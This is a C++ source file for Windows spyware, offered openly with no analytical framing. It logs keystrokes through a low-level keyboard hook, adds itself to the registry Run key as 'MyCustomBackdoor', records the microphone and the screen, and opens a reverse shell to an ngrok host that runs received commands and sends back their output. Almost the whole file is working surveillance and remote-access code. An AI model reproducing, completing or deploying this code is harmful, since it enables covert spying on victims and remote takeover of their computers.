#include<bits/stdc++.h>
#include<windows.h>
#include <vfw.h>
#define ll long long
#define MX 100005
#define pb push_back
#define do {
#define done }
#define read std::cin>>
#define echo std::cout<<
#define start_ int main()
#define finish return 0;
#define bzero(p,size)(void)memset(p,0,(size))
#define Keylogger LRESULT CALLBACK KeyEvent
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "vfw32.lib")

using namespace std;

HHOOK hKeyHook;
ofstream logFile("keylog.txt", ios::app);


int temp[MX];
int num[MX];
int sock;



Keylogger(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* keyInfo = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = keyInfo->vkCode;

        if (vkCode == VK_ESCAPE) {
            PostQuitMessage(0);
        }

        char keyName[128];
        if (GetKeyNameTextA((LONG)(keyInfo->scanCode << 16), keyName, sizeof(keyName)) > 0) {
            logFile << "[" << keyName << "] ";
        } else {
            logFile << "[VK " << vkCode << "] ";
        }

        logFile.flush();
    }
    return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
}

void addToStartup(const char* exePath) {
    HKEY hKey;
    const char* regPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

    LONG result = RegOpenKeyExA(HKEY_CURRENT_USER, regPath, 0, KEY_WRITE, &hKey);
    if (result == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "MyCustomBackdoor", 0, REG_SZ, (const BYTE*)exePath, strlen(exePath));
        RegCloseKey(hKey);
        echo "[*] Added to startup registry.\n";
    } else {
        cerr << "[!] Failed to open registry key.\n";
    }
}

void recordVoice() {
    const int sampleRate = 44100;
    const int bitsPerSample = 16;
    const int channels = 1;
    //10 second record
    const int durationSeconds = 10;
    const int bufferSize = sampleRate * durationSeconds * (bitsPerSample / 8) * channels;

    char* buffer = new char[bufferSize];

    WAVEFORMATEX format = {0};
    format.wFormatTag = WAVE_FORMAT_PCM;
    format.nChannels = channels;
    format.nSamplesPerSec = sampleRate;
    format.wBitsPerSample = bitsPerSample;
    format.nBlockAlign = (channels * bitsPerSample) / 8;
    format.nAvgBytesPerSec = sampleRate * format.nBlockAlign;
    format.cbSize = 0;

    HWAVEIN hWaveIn;
    if (waveInOpen(&hWaveIn, WAVE_MAPPER, &format, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR) {
        cerr << "❌ Failed to open microphone.\n";
        delete[] buffer;
        return;
    }

    WAVEHDR header = {0};
    header.lpData = buffer;
    header.dwBufferLength = bufferSize;

    waveInPrepareHeader(hWaveIn, &header, sizeof(WAVEHDR));
    waveInAddBuffer(hWaveIn, &header, sizeof(WAVEHDR));
    waveInStart(hWaveIn);

    echo "[*] Recording for 5 seconds...\n";
    Sleep(durationSeconds * 1000);

    waveInStop(hWaveIn);
    waveInUnprepareHeader(hWaveIn, &header, sizeof(WAVEHDR));
    waveInClose(hWaveIn);

    time_t now = time(0);
    tm localTime;
    localtime_s(&localTime, &now);
    char filename[30];
    strftime(filename, sizeof(filename), "voice_%Y%m%d.wav", &localTime);

    ofstream out(filename, ios::binary);
    out.write("RIFF", 4);
    int fileSize = bufferSize + 36;
    out.write(reinterpret_cast<const char*>(&fileSize), 4);
    out.write("WAVEfmt ", 8);

    int fmtSize = 16;
    out.write(reinterpret_cast<const char*>(&fmtSize), 4);
    out.write(reinterpret_cast<const char*>(&format.wFormatTag), 2);
    out.write(reinterpret_cast<const char*>(&format.nChannels), 2);
    out.write(reinterpret_cast<const char*>(&format.nSamplesPerSec), 4);
    out.write(reinterpret_cast<const char*>(&format.nAvgBytesPerSec), 4);
    out.write(reinterpret_cast<const char*>(&format.nBlockAlign), 2);
    out.write(reinterpret_cast<const char*>(&format.wBitsPerSample), 2);

    out.write("data", 4);
    out.write(reinterpret_cast<const char*>(&bufferSize), 4);
    out.write(buffer, bufferSize);
    out.close();

    delete[] buffer;
    echo "[*] Voice saved to: " << filename << "\n";
}



class Hack{
public:
};

class ReverseShell:public Hack{
public:
         void Shell()
         {
             char buffer[MX];
             char container[MX];
             char total_response[MX];

             while(1){
             bzero(buffer,sizeof(buffer));
             bzero(container,sizeof(container));
             bzero(total_response,sizeof(total_response));
             recv(sock,buffer,sizeof(buffer),0);

             FILE *fp;
             fp=_popen(buffer,"r");
             while(fgets(container,sizeof(container),fp)!=NULL)
             {
                 strcat(total_response,container);
             }
             send(sock,total_response,sizeof(total_response),0);
             fclose(fp);

             }

         }
};

class ShellExe:public ReverseShell{
public:
         void Execute()
         {
           WSADATA wsaData;
           struct sockaddr_in x;
           const char *ip="0.tcp.in.ngrok.io";
           ll port=16955;

           WSAStartup(MAKEWORD(2,0),&wsaData);
           sock=socket(AF_INET,SOCK_STREAM,0);
           bzero(&x,sizeof(x));

           x.sin_family=AF_INET;
           x.sin_port=htons(port);

           struct hostent *host;
           host = gethostbyname(ip);
           x.sin_addr = *((struct in_addr *)host->h_addr);

           while (connect(sock, (struct sockaddr *)&x, sizeof(x)) != 0) {
               Sleep(10);
            }
           Shell();

        }
};

start_
do
      AVIFileInit();

    // Create AVI file
    PAVIFILE pfile;
    HRESULT hr = AVIFileOpen(&pfile, "screen_record.avi", OF_WRITE | OF_CREATE, NULL);
    if (hr != 0) {
        std::cerr << "[-] Failed to create AVI file.\n";
        return -1;
    }

    // Get screen dimensions
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    // Create AVI stream
    AVISTREAMINFO strhdr = { 0 };
    strhdr.fccType = streamtypeVIDEO;
    strhdr.fccHandler = mmioFOURCC('D', 'I', 'B', ' ');
    strhdr.dwScale = 1;
    strhdr.dwRate = 10; // 10 fps
    strhdr.dwSuggestedBufferSize = width * height * 3;
    SetRect(&strhdr.rcFrame, 0, 0, width, height);

    PAVISTREAM pstream;
    hr = AVIFileCreateStream(pfile, &pstream, &strhdr);
    if (hr != 0) {
        std::cerr << "[-] Failed to create AVI stream.\n";
        AVIFileRelease(pfile);
        return -1;
    }

    // Set stream format
    BITMAPINFOHEADER bih = { 0 };
    bih.biSize = sizeof(BITMAPINFOHEADER);
    bih.biWidth = width;
    bih.biHeight = height;
    bih.biPlanes = 1;
    bih.biBitCount = 24;
    bih.biCompression = BI_RGB;
    bih.biSizeImage = width * height * 3;

    hr = AVIStreamSetFormat(pstream, 0, &bih, sizeof(bih));
    if (hr != 0) {
        std::cerr << "[-] Failed to set stream format.\n";
        AVIStreamRelease(pstream);
        AVIFileRelease(pfile);
        return -1;
    }

    // Prepare screen capture
    HDC hScreenDC = GetDC(NULL);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
    SelectObject(hMemoryDC, hBitmap);

    BYTE* buffer = new BYTE[bih.biSizeImage];
    int frameCount = 0;

    cout << "[+] Recording screen... Press ESC to stop.\n";

    while (true) {
        // Check for ESC key
        if (GetAsyncKeyState(VK_ESCAPE) & 0x8000) {
            cout << "[*] ESC pressed. Stopping recording...\n";
            break;
        }

        // Capture screen
        BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);
        GetDIBits(hMemoryDC, hBitmap, 0, height, buffer, (BITMAPINFO*)&bih, DIB_RGB_COLORS);

        // Write frame
        hr = AVIStreamWrite(pstream, frameCount, 1, buffer, bih.biSizeImage, AVIIF_KEYFRAME, NULL, NULL);
        if (hr != 0) {
            std::cerr << "[-] Failed to write frame " << frameCount << "\n";
            break;
        }

        frameCount++;
        Sleep(100); // 10 fps
    }

    // Cleanup
    delete[] buffer;
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hScreenDC);
    AVIStreamRelease(pstream);
    AVIFileRelease(pfile);
    AVIFileExit();

    std::cout << "[+] Recording complete. Saved as screen_record.avi\n";





    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    addToStartup(exePath);

    MSG msg;
    hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyEvent, NULL, 0);
    if (!hKeyHook) {
        cerr << "Hook failed." << endl;
        return 1;
    }

    echo "[*] Logging started. Press ESC to exit.\n";

    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hKeyHook);
    logFile.close();
    echo "[*] Logging stopped.\n";





    ShellExe *se=new ShellExe();
    se->Execute();



   finish
done

